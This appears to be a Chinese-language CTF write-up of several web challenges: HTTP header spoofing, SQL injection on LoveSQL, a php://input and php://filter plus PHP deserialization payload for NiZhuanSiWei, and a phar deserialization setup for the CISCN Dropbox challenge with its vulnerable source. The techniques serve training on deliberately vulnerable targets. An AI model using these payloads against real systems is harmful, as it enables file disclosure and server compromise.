<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214190220.png" alt=""></p>
<p>又是<code>Referer</code>伪造的</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214190510.png" alt=""></p>
<p>然后伪造<code>User-Agent</code></p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214190402.png" alt=""></p>
<p>接下来伪造<code>X-Forwarded-For</code></p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214190450.png" alt=""></p>
<p>得到<code>flag</code></p>
<h1 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h1><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214193127.png" alt=""></p>
<p>这道题找了半天，注入点在<code>password</code>这里</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214193413.png" alt=""></p>
<p>直接<code>sqlmap</code>全部一把梭，或者自己<code>extractvalue</code>一步步手注也可</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214194017.png" alt=""></p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214194047.png" alt=""></p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214194119.png" alt=""></p>
<p>这里分开一段一段查询即可</p>
<h1 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1><p>看到源代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Not now!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>第一个<code>if</code>直接<code>php://input</code>绕过即可</p>
<p>然后这边用<code>php://filter</code>读一下<code>useless.php</code>的源码</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214195733.png" alt=""></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>很明显由于过滤了<code>flag</code>，得需要在包含<code>useless.php</code>文件然后用反序列化来读</p>
<p>这里来构造一下反序列化</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">  <span class="keyword">public</span> $file=<span class="string">"flag.php"</span>;  </span><br><span class="line"></span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Flag;</span><br><span class="line"><span class="keyword">echo</span> serialize($a)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出反序列化结果:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">"Flag"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"file"</span>;s:<span class="number">8</span>:<span class="string">"flag.php"</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>然后包含<code>useless.php</code>文件，<code>password</code>设置为<code>O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code>即得到<code>flag</code></p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214200633.png" alt=""></p>
<h1 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h1><p>打开后进行常规的注册登录操作，发现登录后是个网盘界面</p>
<p>其中<code>download.php</code>存在任意文件下载漏洞</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200215002005.png" alt=""></p>
<p>这里把所有的有关文件全部下载下来看看</p>
<p><strong>upload.php</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_FILES[<span class="string">"file"</span>])) &#123;</span><br><span class="line">    $filename = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">    $pos = strrpos($filename, <span class="string">"."</span>);</span><br><span class="line">    <span class="keyword">if</span> ($pos !== <span class="keyword">false</span>) &#123;</span><br><span class="line">        $filename = substr($filename, <span class="number">0</span>, $pos);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $fileext = <span class="string">".gif"</span>;</span><br><span class="line">    <span class="keyword">switch</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'image/gif'</span>:</span><br><span class="line">            $fileext = <span class="string">".gif"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'image/jpeg'</span>:</span><br><span class="line">            $fileext = <span class="string">".jpg"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'image/png'</span>:</span><br><span class="line">            $fileext = <span class="string">".png"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">false</span>, <span class="string">"error"</span> =&gt; <span class="string">"Only gif/jpg/png allowed"</span>);</span><br><span class="line">            Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">            <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (strlen($filename) &lt; <span class="number">40</span> &amp;&amp; strlen($filename) !== <span class="number">0</span>) &#123;</span><br><span class="line">        $dst = $_SESSION[<span class="string">'sandbox'</span>] . $filename . $fileext;</span><br><span class="line">        move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], $dst);</span><br><span class="line">        $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">true</span>, <span class="string">"error"</span> =&gt; <span class="string">""</span>);</span><br><span class="line">        Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">        <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">false</span>, <span class="string">"error"</span> =&gt; <span class="string">"Invaild filename"</span>);</span><br><span class="line">        Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">        <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>delete.php</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'filename'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span><br><span class="line"></span><br><span class="line">chdir($_SESSION[<span class="string">'sandbox'</span>]);</span><br><span class="line">$file = <span class="keyword">new</span> File();</span><br><span class="line">$filename = (string) $_POST[<span class="string">'filename'</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen($filename) &lt; <span class="number">40</span> &amp;&amp; $file-&gt;open($filename)) &#123;</span><br><span class="line">    $file-&gt;detele();</span><br><span class="line">    Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">    $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">true</span>, <span class="string">"error"</span> =&gt; <span class="string">""</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">    $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">false</span>, <span class="string">"error"</span> =&gt; <span class="string">"File not exist"</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>download.php</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'filename'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span><br><span class="line">ini_set(<span class="string">"open_basedir"</span>, getcwd() . <span class="string">":/etc:/tmp"</span>);</span><br><span class="line"></span><br><span class="line">chdir($_SESSION[<span class="string">'sandbox'</span>]);</span><br><span class="line">$file = <span class="keyword">new</span> File();</span><br><span class="line">$filename = (string) $_POST[<span class="string">'filename'</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen($filename) &lt; <span class="number">40</span> &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, <span class="string">"flag"</span>) === <span class="keyword">false</span>) &#123;</span><br><span class="line">    Header(<span class="string">"Content-type: application/octet-stream"</span>);</span><br><span class="line">    Header(<span class="string">"Content-Disposition: attachment; filename="</span> . basename($filename));</span><br><span class="line">    <span class="keyword">echo</span> $file-&gt;close();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"File not exist"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到这里限制了可读目录为<code>/etc</code>、<code>/tmp</code>和当前目录</p>
<p>以及当前目录被设置到<code>$_SESSION[&#39;sandbox&#39;]</code>，所以下载的时候需要使用<code>../../</code>进行跳转</p>
<p><strong>index.php</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">&lt;meta name=<span class="string">"viewport"</span> content=<span class="string">"width=device-width, initial-scale=1, shrink-to-fit=no"</span>&gt;</span><br><span class="line">&lt;title&gt;网盘管理&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;link href=<span class="string">"static/css/bootstrap.min.css"</span> rel=<span class="string">"stylesheet"</span>&gt;</span><br><span class="line">    &lt;link href=<span class="string">"static/css/panel.css"</span> rel=<span class="string">"stylesheet"</span>&gt;</span><br><span class="line">    &lt;script src=<span class="string">"static/js/jquery.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">"static/js/bootstrap.bundle.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">"static/js/toast.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">"static/js/panel.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;nav aria-label=<span class="string">"breadcrumb"</span>&gt;</span><br><span class="line">    &lt;ol class="breadcrumb"&gt;</span><br><span class="line">        &lt;li class="breadcrumb-item active"&gt;管理面板&lt;/li&gt;</span><br><span class="line">        &lt;li class="breadcrumb-item active"&gt;&lt;label for="fileInput" class="fileLabel"&gt;上传文件&lt;/label&gt;&lt;/li&gt;</span><br><span class="line">        &lt;li class="active ml-auto"&gt;&lt;a href="#"&gt;你好 &lt;?php echo $_SESSION['username']?&gt;&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">    &lt;/ol&gt;</span><br><span class="line">&lt;/nav&gt;</span><br><span class="line">&lt;input type="file" id="fileInput" class="hidden"&gt;</span><br><span class="line">&lt;div class="top" id="toast-container"&gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> FileList($_SESSION[<span class="string">'sandbox'</span>]);</span><br><span class="line">$a-&gt;Name();</span><br><span class="line">$a-&gt;Size();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>class.php</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$dbaddr = <span class="string">"127.0.0.1"</span>;</span><br><span class="line">$dbuser = <span class="string">"root"</span>;</span><br><span class="line">$dbpass = <span class="string">"root"</span>;</span><br><span class="line">$dbname = <span class="string">"dropbox"</span>;</span><br><span class="line">$db = <span class="keyword">new</span> mysqli($dbaddr, $dbuser, $dbpass, $dbname);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> $db;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $db;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;</span><br><span class="line">db = $db;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span><span class="params">($username)</span> </span>&#123;</span><br><span class="line">$stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;"</span>);</span><br><span class="line">$stmt-&gt;bind_param(<span class="string">"s"</span>, $username);</span><br><span class="line">$stmt-&gt;execute();</span><br><span class="line">$stmt-&gt;store_result();</span><br><span class="line">$count = $stmt-&gt;num_rows;</span><br><span class="line"><span class="keyword">if</span> ($count === <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;user_exist($username)) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">$password = sha1($password . <span class="string">"SiAchGHmFx"</span>);</span><br><span class="line">$stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);"</span>);</span><br><span class="line">$stmt-&gt;bind_param(<span class="string">"ss"</span>, $username, $password);</span><br><span class="line">$stmt-&gt;execute();</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;user_exist($username)) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">$password = sha1($password . <span class="string">"SiAchGHmFx"</span>);</span><br><span class="line">$stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"SELECT `password` FROM `users` WHERE `username` = ?;"</span>);</span><br><span class="line">$stmt-&gt;bind_param(<span class="string">"s"</span>, $username);</span><br><span class="line">$stmt-&gt;execute();</span><br><span class="line">$stmt-&gt;bind_result($expect);</span><br><span class="line">$stmt-&gt;fetch();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($expect) &amp;&amp; $expect === $password) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;db-&gt;close();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> $files;</span><br><span class="line"><span class="keyword">private</span> $results;</span><br><span class="line"><span class="keyword">private</span> $funcs;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">$filenames = scandir($path);</span><br><span class="line">$key = array_search(<span class="string">"."</span>, $filenames);</span><br><span class="line"><span class="keyword">unset</span>($filenames[$key]);</span><br><span class="line">$key = array_search(<span class="string">".."</span>, $filenames);</span><br><span class="line"><span class="keyword">unset</span>($filenames[$key]);</span><br><span class="line"><span class="keyword">foreach</span> ($filenames <span class="keyword">as</span> $filename) &#123;</span><br><span class="line">  $file = <span class="keyword">new</span> File();</span><br><span class="line">  $file-&gt;open($path . $filename);</span><br><span class="line">  array_push(<span class="keyword">$this</span>-&gt;files, $file);</span><br><span class="line">  <span class="keyword">$this</span>-&gt;results[$file-&gt;name()] = <span class="keyword">array</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($func, $args)</span> </span>&#123;</span><br><span class="line">array_push(<span class="keyword">$this</span>-&gt;funcs, $func);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">  <span class="keyword">$this</span>-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">$table = <span class="string">'</span></span><br><span class="line"><span class="string">&lt;div id="container" class="container"&gt;</span></span><br><span class="line"><span class="string">  &lt;div class="table-responsive"&gt;</span></span><br><span class="line"><span class="string">    &lt;table id="table" class="table table-bordered table-hover sm-font"&gt;'</span>;</span><br><span class="line">      $table .= <span class="string">'</span></span><br><span class="line"><span class="string">      &lt;thead&gt;</span></span><br><span class="line"><span class="string">        &lt;tr&gt;'</span>;</span><br><span class="line">          <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;funcs <span class="keyword">as</span> $func) &#123;</span><br><span class="line">            $table .= <span class="string">'</span></span><br><span class="line"><span class="string">          &lt;th scope="col" class="text-center"&gt;'</span> . htmlentities($func) . <span class="string">'&lt;/th&gt;</span></span><br><span class="line"><span class="string">          '</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $table .= <span class="string">'</span></span><br><span class="line"><span class="string">          &lt;th scope="col" class="text-center"&gt;Opt&lt;/th&gt;</span></span><br><span class="line"><span class="string">          '</span>;</span><br><span class="line">          $table .= <span class="string">'&lt;/thead&gt;</span></span><br><span class="line"><span class="string">        &lt;tbody&gt;'</span>;</span><br><span class="line">          <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;results <span class="keyword">as</span> $filename =&gt; $result) &#123;</span><br><span class="line">            $table .= <span class="string">'</span></span><br><span class="line"><span class="string">          &lt;tr&gt;'</span>;</span><br><span class="line">            <span class="keyword">foreach</span> ($result <span class="keyword">as</span> $func =&gt; $value) &#123;</span><br><span class="line">              $table .= <span class="string">'</span></span><br><span class="line"><span class="string">            &lt;td class="text-center"&gt;'</span> . htmlentities($value) . <span class="string">'&lt;/td&gt;</span></span><br><span class="line"><span class="string">            '</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          $table .= <span class="string">'</span></span><br><span class="line"><span class="string">            &lt;td class="text-center" filename="'</span> . htmlentities($filename) . <span class="string">'"&gt;</span></span><br><span class="line"><span class="string">              &lt;a href="#" class="download"&gt;&lt;/a&gt;</span></span><br><span class="line"><span class="string">              /</span></span><br><span class="line"><span class="string">              &lt;a href="#" class="delete"&gt;&lt;/a&gt;</span></span><br><span class="line"><span class="string">            &lt;/td&gt;</span></span><br><span class="line"><span class="string">            '</span>;</span><br><span class="line">            $table .= <span class="string">'&lt;/tr&gt;</span></span><br><span class="line"><span class="string">          '</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> $table;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">      <span class="keyword">public</span> $filename;</span><br><span class="line">      <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span><span class="params">($filename)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">        <span class="keyword">if</span> (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> basename(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $size = filesize(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        $units = <span class="keyword">array</span>(<span class="string">' B'</span>, <span class="string">' KB'</span>, <span class="string">' MB'</span>, <span class="string">' GB'</span>, <span class="string">' TB'</span>);</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $size &gt;= <span class="number">1024</span> &amp;&amp; $i &lt; <span class="number">4</span>; $i++) $size /= <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">return</span> round($size, <span class="number">2</span>).$units[$i];</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        unlink(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里由于存在文件操作函数<code>file_get_contents</code>，那么我们可以把一个序列化后的对象存储在<code>phar</code>文件中，由于<code>phar</code>文件在修改后缀后，也可以通过<code>phar://</code>协议来读，这样就突破了<code>jpg/png/gif</code>文件上传限制</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200215140849.png" alt=""></p>
<p>具体详细参考<a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">利用 phar 拓展 php 反序列化漏洞攻击面</a></p>
<p><strong>利用条件：</strong></p>
<ol>
<li>phar文件要能够上传到服务器端</li>
<li>要有可用的魔术方法作为“跳板”</li>
<li>要有文件操作函数，如file_exists()，fopen()，file_get_contents()，file()</li>
<li>文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤</li>
</ol>
<p>这里给出一个<code>Demo</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line">    $o = <span class="keyword">new</span> TestObject();</span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>做题修改这个<code>Demo</code>即可</p>
<p>这里由于<code>download</code>限制了可读路径，那么我们从<code>delete.php</code>文件入手</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200215145053.png" alt=""></p>
